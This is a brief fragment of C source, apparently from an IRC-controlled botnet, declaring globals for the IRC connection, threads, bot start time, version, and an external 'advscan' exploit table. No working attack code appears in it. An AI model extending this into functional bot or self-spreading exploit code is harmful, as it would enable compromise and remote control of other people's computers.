
// main irc structure
IRC mainirc;

// threads structure
THREAD threads[MAXTHREADS]; 



// misc.
BOOL success = FALSE;   // if true then we made successful connect attempt
DWORD started;          // time bot was started
int current_version=0;  // current bot version (from versionlist)

// advscan
extern EXPLOIT exploit[];
